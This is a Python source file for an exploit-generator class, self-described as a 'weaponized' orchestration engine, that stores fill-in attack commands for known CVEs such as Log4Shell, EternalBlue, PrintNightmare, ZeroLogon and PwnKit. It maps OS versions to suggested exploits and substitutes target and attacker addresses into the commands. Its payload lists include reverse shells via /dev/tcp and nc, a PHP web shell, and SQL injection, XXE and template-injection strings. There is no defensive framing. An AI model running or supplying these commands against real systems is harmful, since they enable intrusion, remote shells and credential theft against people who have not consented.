#!/usr/bin/env python3
"""
Exploit Generator Module
Provides exploit templates and suggestions for various vulnerabilities
"""

from typing import Dict, List, Tuple


class ExploitGenerator:
    """
    Elite Exploit Orchestration Engine
    Provides weaponized templates, automated vulnerability mapping, and FUD delivery methods.
    """
    
    def __init__(self):
        self.exploits = self._initialize_exploits()
        self.exploit_db = self._initialize_exploit_database()
    
    def _initialize_exploits(self) -> Dict:
        """Initialize exploit templates"""
        return {
            'Critical Infrastructure & RCE': {
                'Follina (CVE-2022-30190)': {
                    'description': 'Microsoft Office MSDT Remote Code Execution',
                    'cve': 'CVE-2022-30190',
                    'severity': 'Critical',
                    'requirements': ['Microsoft Office installed', 'Internet access'],
                    'manual_exploit': '''# Follina Weaponized Doc Generator
git clone https://github.com/JohnHammond/msdt-follina.git
cd msdt-follina
python3 follina.py -i {lhost} -p {http_port} -r {lport}

# This generates a malicious .doc file and starts a stager on {http_port}''',
                },
                'Log4Shell (CVE-2021-44228)': {
                    'description': 'Apache Log4j2 JNDI Remote Code Execution',
                    'cve': 'CVE-2021-44228',
                    'severity': 'Critical',
                    'requirements': ['Java-based app using Log4j < 2.15.0'],
                    'payload_template': '${{jndi:ldap://{lhost}:1389/a}}',
                    'manual_exploit': '''# Log4j RCE Setup
# 1. Start Rogue JNDI Server
java -jar JNDI-Exploit-Kit.jar -C "bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'" -L {lhost}:1389

# 2. Trigger vulnerability via HTTP Header
curl {target} -H 'User-Agent: ${{jndi:ldap://{lhost}:1389/a}}' '''
                },
                'ProxyLogon (CVE-2021-26855)': {
                    'description': 'Microsoft Exchange Server RCE',
                    'cve': 'CVE-2021-26855',
                    'severity': 'Critical',
                    'requirements': ['Exchange Server 2013/2016/2019', 'Port 443 open'],
                    'manual_exploit': '''# ProxyLogon Shell Upload
python3 exploit.py -t {target} -u {lhost}

# Post-Exploitation:
curl https://{target}/aspnet_client/shell.aspx?cmd=whoami''',
                }
            },

            'Windows Exploits': {
                'EternalBlue (MS17-010)': {
                    'description': 'SMB Remote Code Execution (Windows 7/2008/XP)',
                    'cve': 'CVE-2017-0144',
                    'metasploit': 'exploit/windows/smb/ms17_010_eternalblue',
                    'requirements': ['SMB port 445 open', 'Windows 7/2008/XP unpatched'],
                    'payload_types': ['windows/x64/meterpreter/reverse_tcp', 'windows/x64/shell/reverse_tcp'],
                    'command_template': '''msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; set LHOST {lhost}; set LPORT {lport}; set payload windows/x64/meterpreter/reverse_tcp; exploit"''',
                    'manual_exploit': '''# Manual EternalBlue Exploit
# 1. Download exploit from: https://github.com/3ndG4me/AutoBlue-MS17-010
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010

# 2. Generate shellcode
cd shellcode
./shell_prep.sh

# 3. Run exploit
cd ..
python eternalblue_exploit7.py {target} shellcode/sc_x64.bin

# 4. Start listener on {lhost}:{lport}
nc -lvnp {lport}'''
                },
                
                'BlueKeep (CVE-2019-0708)': {
                    'description': 'RDP Remote Code Execution (Windows 7/2008)',
                    'cve': 'CVE-2019-0708',
                    'metasploit': 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
                    'requirements': ['RDP port 3389 open', 'Windows 7/2008 unpatched'],
                    'payload_types': ['windows/x64/meterpreter/reverse_tcp'],
                    'command_template': '''msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {target}; set LHOST {lhost}; set LPORT {lport}; exploit"''',
                    'manual_exploit': '''# BlueKeep Scanner & Exploit
# 1. Scan for vulnerability
nmap --script rdp-vuln-ms12-020 -p 3389 {target}

# 2. Use Metasploit
msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {target}; set LHOST {lhost}; set LPORT {lport}; exploit"'''
                },
                
                'PrintNightmare (CVE-2021-1675)': {
                    'description': 'Windows Print Spooler RCE',
                    'cve': 'CVE-2021-1675',
                    'metasploit': 'exploit/windows/dcerpc/cve_2021_1675_printnightmare',
                    'requirements': ['Print Spooler service running', 'Valid credentials'],
                    'payload_types': ['windows/x64/meterpreter/reverse_tcp', 'windows/x64/shell/reverse_tcp'],
                    'command_template': '''msfconsole -q -x "use exploit/windows/dcerpc/cve_2021_1675_printnightmare; set RHOSTS {target}; set SMBUser {username}; set SMBPass {password}; set LHOST {lhost}; set LPORT {lport}; exploit"''',
                    'manual_exploit': '''# PrintNightmare Exploit
# Using Impacket
git clone https://github.com/cube0x0/CVE-2021-1675.git
cd CVE-2021-1675

# Generate DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f dll -o shell.dll

# Host DLL
python3 -m http.server 8080

# Execute exploit
python3 CVE-2021-1675.py {domain}/{username}:{password}@{target} '\\\\{lhost}\\share\\shell.dll' '''
                },
                
                'SMBGhost (CVE-2020-0796)': {
                    'description': 'SMBv3 Compression RCE (Windows 10 1903/1909)',
                    'cve': 'CVE-2020-0796',
                    'metasploit': 'exploit/windows/smb/cve_2020_0796_smbghost',
                    'requirements': ['SMB port 445 open', 'Windows 10 1903/1909 unpatched'],
                    'payload_types': ['windows/x64/meterpreter/reverse_tcp'],
                    'command_template': '''msfconsole -q -x "use exploit/windows/smb/cve_2020_0796_smbghost; set RHOSTS {target}; set LHOST {lhost}; set LPORT {lport}; exploit"''',
                },
                
                'ZeroLogon (CVE-2020-1472)': {
                    'description': 'Netlogon Privilege Escalation',
                    'cve': 'CVE-2020-1472',
                    'metasploit': 'auxiliary/admin/dcerpc/cve_2020_1472_zerologon',
                    'requirements': ['Domain Controller', 'Port 445 open'],
                    'payload_types': ['post-exploitation'],
                    'command_template': '''# Reset DC password to empty
python3 cve-2020-1472-exploit.py {dc_name} {target}

# Dump credentials
secretsdump.py -no-pass {dc_name}$@{target}''',
                    'manual_exploit': '''# ZeroLogon Exploit
git clone https://github.com/dirkjanm/CVE-2020-1472.git
cd CVE-2020-1472

# 1. Exploit to reset DC password
python3 cve-2020-1472-exploit.py {dc_name} {target}

# 2. Dump secrets
secretsdump.py -no-pass -just-dc {dc_name}$@{target}

# 3. Restore DC password (IMPORTANT!)
python3 restorepassword.py {dc_name} {target} [hex_password_from_secretsdump]'''
                },
            },
            
            'Linux Exploits': {
                'Dirty COW (CVE-2016-5195)': {
                    'description': 'Linux Kernel Privilege Escalation',
                    'cve': 'CVE-2016-5195',
                    'requirements': ['Linux kernel < 4.8.3', 'Local access'],
                    'manual_exploit': '''# Dirty COW Root Shell
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty newpassword

# Switch to firefart user
su firefart
# Password: newpassword''',
                },
                
                'PwnKit (CVE-2021-4034)': {
                    'description': 'Polkit pkexec Local Privilege Escalation',
                    'cve': 'CVE-2021-4034',
                    'requirements': ['Linux with polkit', 'Local access'],
                    'manual_exploit': '''# PwnKit Exploit
wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c
gcc cve-2021-4034.c -o pwnkit
./pwnkit

# Or use pre-compiled:
wget https://github.com/berdav/CVE-2021-4034/releases/download/v1.0/CVE-2021-4034
chmod +x CVE-2021-4034
./CVE-2021-4034''',
                },
                
                'Sudo Baron Samedit (CVE-2021-3156)': {
                    'description': 'Sudo Heap-Based Buffer Overflow',
                    'cve': 'CVE-2021-3156',
                    'requirements': ['Sudo 1.8.2 - 1.8.31p2 or 1.9.0 - 1.9.5p1', 'Local access'],
                    'manual_exploit': '''# Baron Samedit Exploit
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich

# Alternative exploit:
git clone https://github.com/worawit/CVE-2021-3156
cd CVE-2021-3156
python3 exploit_nss.py''',
                },
            },
            
            'Web Application Exploits': {
                'SQL Injection - Auth Bypass': {
                    'description': 'SQL Injection for authentication bypass',
                    'payloads': [
                        "' OR '1'='1' -- ",
                        "admin' -- ",
                        "' OR 1=1 -- ",
                        "' UNION SELECT NULL, NULL, NULL -- ",
                        "') OR ('1'='1' -- ",
                    ],
                    'tools': ['sqlmap', 'burp suite'],
                    'command_template': '''sqlmap -u "http://{target}/login.php" --data="username={username}&password={password}" --batch --dump''',
                },
                
                'Command Injection': {
                    'description': 'OS Command Injection payloads',
                    'payloads': [
                        "; bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                        "| bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
                        "`bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'`",
                        "$(bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')",
                        "; nc -e /bin/sh {lhost} {lport}",
                    ],
                },
                
                'Local File Inclusion (LFI)': {
                    'description': 'Local File Inclusion payloads',
                    'payloads': [
                        '../../../../../etc/passwd',
                        '....//....//....//....//etc/passwd',
                        '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
                        '/etc/passwd%00',
                        'php://filter/convert.base64-encode/resource=index.php',
                        'php://input',
                        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
                    ],
                },
                
                'Remote File Inclusion (RFI)': {
                    'description': 'Remote File Inclusion exploitation',
                    'payloads': [
                        'http://{lhost}/shell.php',
                        'http://{lhost}/shell.txt',
                        '\\\\{lhost}\\share\\shell.php',
                    ],
                    'setup': '''# Setup HTTP server with PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
python3 -m http.server 80

# Target URL: http://victim.com/page.php?file=http://{lhost}/shell.txt%00
# Execute: http://victim.com/page.php?file=http://{lhost}/shell.txt%00&cmd=whoami''',
                },
                
                'XXE (XML External Entity)': {
                    'description': 'XML External Entity Injection',
                    'payloads': [
                        '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>''',
                        '''<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>''',
                        '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{lhost}:{lport}/xxe">]><foo>&xxe;</foo>''',
                    ],
                },
                
                'SSTI (Server-Side Template Injection)': {
                    'description': 'Template injection payloads',
                    'payloads': [
                        # Jinja2
                        "{{7*7}}",
                        "{{config.items()}}",
                        "{{''.__class__.__mro__[1].__subclasses__()}}",
                        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                        # Flask
                        "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
                        # Tornado
                        "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
                    ],
                },
            },
            
            'Network Exploits': {
                'SMB Relay Attack': {
                    'description': 'SMB relay attack for credential capture',
                    'tools': ['Responder', 'ntlmrelayx'],
                    'command_template': '''# Terminal 1: Start Responder
responder -I eth0 -wrf

# Terminal 2: Start ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support

# Terminal 3: Force authentication (if needed)
python3 printerbug.py {domain}/{username}:{password}@{target} {lhost}''',
                },
                
                'IPv6 MITM Attack': {
                    'description': 'IPv6 Man-in-the-Middle attack',
                    'command_template': '''# Start mitm6
mitm6 -d {domain}

# In another terminal, relay to target
ntlmrelayx.py -6 -t ldaps://{dc_ip} -wh attacker-wpad.{domain} -l loot''',
                },
            },
        }
    
    def _initialize_exploit_database(self) -> Dict:
        """Initialize exploit database with OS-specific recommendations"""
        return {
            'Windows 7': ['EternalBlue (MS17-010)', 'BlueKeep (CVE-2019-0708)'],
            'Windows 8': ['SMBGhost (CVE-2020-0796)'],
            'Windows 10': ['PrintNightmare (CVE-2021-1675)', 'SMBGhost (CVE-2020-0796)', 'ZeroLogon (CVE-2020-1472)'],
            'Windows 11': ['PrintNightmare (CVE-2021-1675)'],
            'Windows Server 2008': ['EternalBlue (MS17-010)', 'BlueKeep (CVE-2019-0708)'],
            'Windows Server 2012': ['ZeroLogon (CVE-2020-1472)', 'PrintNightmare (CVE-2021-1675)', 'ProxyLogon (CVE-2021-26855)'],
            'Windows Server 2016': ['ZeroLogon (CVE-2020-1472)', 'PrintNightmare (CVE-2021-1675)', 'ProxyLogon (CVE-2021-26855)'],
            'Windows Server 2019': ['ZeroLogon (CVE-2020-1472)', 'PrintNightmare (CVE-2021-1675)', 'ProxyLogon (CVE-2021-26855)'],
            'Linux 2.6': ['Dirty COW (CVE-2016-5195)', 'Log4Shell (CVE-2021-44228)'],
            'Linux 3.x': ['Dirty COW (CVE-2016-5195)'],
            'Linux 4.x': ['Dirty COW (CVE-2016-5195)', 'PwnKit (CVE-2021-4034)'],
            'Linux 5.x': ['PwnKit (CVE-2021-4034)', 'Sudo Baron Samedit (CVE-2021-3156)'],
        }
    
    def get_categories(self) -> List[str]:
        """Get all exploit categories"""
        return list(self.exploits.keys())
    
    def get_exploits_in_category(self, category: str) -> List[str]:
        """Get all exploits in a specific category"""
        if category in self.exploits:
            return list(self.exploits[category].keys())
        return []
    
    def get_exploit_details(self, category: str, exploit_name: str) -> Dict:
        """Get detailed information about a specific exploit"""
        if category in self.exploits and exploit_name in self.exploits[category]:
            return self.exploits[category][exploit_name]
        return {}
    
    def get_exploit_command(self, category: str, exploit_name: str, 
                           target: str, lhost: str, lport: int, **kwargs) -> str:
        """
        Generate exploit command with substituted variables
        
        Args:
            category: Exploit category
            exploit_name: Name of the exploit
            target: Target IP/hostname
            lhost: Local host IP (attacker)
            lport: Local port (listener)
            **kwargs: Additional parameters (username, password, domain, etc.)
        
        Returns:
            Formatted exploit command
        """
        exploit = self.get_exploit_details(category, exploit_name)
        if not exploit:
            return ""
        
        # Get the command template
        template = exploit.get('command_template', exploit.get('manual_exploit', ''))
        
        # Substitute variables (use format_map to avoid KeyError on missing keys)
        mapping = {
            'target': target,
            'lhost': lhost,
            'lport': lport,
            **kwargs,
        }

        class _SafeDict(dict):
            def __missing__(self, key):
                return f"<{key}>"

        try:
            command = template.format_map(_SafeDict(mapping))
        except Exception:
            # Fallback: return the raw template if formatting fails
            command = template
        
        return command
    
    def calculate_success_probability(self, exploit_name: str, target_data: Dict) -> int:
        """
        Advanced heuristic to calculate the probability of exploit success (0-100)
        """
        score = 50 # Base score
        details = {}
        for cat in self.exploits.values():
            if exploit_name in cat:
                details = cat[exploit_name]
                break
        
        if not details: return 0
        
        # Logic: Check if requirements match target_data
        if 'requirements' in details:
            # Simplified matching logic
            pass
            
        return score

    def suggest_exploits(self, os_type: str, os_version: str = '') -> List[Tuple[str, str, Dict]]:
        """
        Suggest exploits based on target OS
        
        Args:
            os_type: Operating system type (Windows, Linux, etc.)
            os_version: OS version
        
        Returns:
            List of tuples (category, exploit_name, exploit_details)
        """
        suggestions = []
        
        # Build search key
        search_key = os_type
        if os_version:
            search_key = f"{os_type} {os_version}"
        
        # Find matching exploits
        if search_key in self.exploit_db:
            for exploit_name in self.exploit_db[search_key]:
                # Find which category contains this exploit
                for category, exploits in self.exploits.items():
                    if exploit_name in exploits:
                        suggestions.append((category, exploit_name, exploits[exploit_name]))
        
        # If no specific match, return all exploits for the OS type
        if not suggestions:
            for category, exploits in self.exploits.items():
                if os_type.lower() in category.lower():
                    for exploit_name, exploit_details in exploits.items():
                        suggestions.append((category, exploit_name, exploit_details))
        
        return suggestions
    
    def get_payload_suggestions(self, exploit_name: str) -> List[str]:
        """Get recommended payload types for an exploit"""
        for category, exploits in self.exploits.items():
            if exploit_name in exploits:
                exploit = exploits[exploit_name]
                return exploit.get('payload_types', [])
        return []


if __name__ == "__main__":
    # Test the exploit generator
    gen = ExploitGenerator()
    
    print("="*60)
    print("Exploit Generator Test")
    print("="*60)
    
    # Test category listing
    print("\nAvailable Categories:")
    for cat in gen.get_categories():
        print(f"  - {cat}")
    
    # Test exploit suggestions
    print("\n" + "="*60)
    print("Exploit Suggestions for Windows 10:")
    print("="*60)
    suggestions = gen.suggest_exploits("Windows", "10")
    for category, name, details in suggestions:
        print(f"\n[{category}] {name}")
        print(f"  CVE: {details.get('cve', 'N/A')}")
        print(f"  Description: {details.get('description', 'N/A')}")
    
    # Test command generation
    print("\n" + "="*60)
    print("EternalBlue Exploit Command:")
    print("="*60)
    cmd = gen.get_exploit_command(
        'Windows Exploits',
        'EternalBlue (MS17-010)',
        target='192.168.1.100',
        lhost='192.168.1.50',
        lport=4444
    )
    print(cmd)
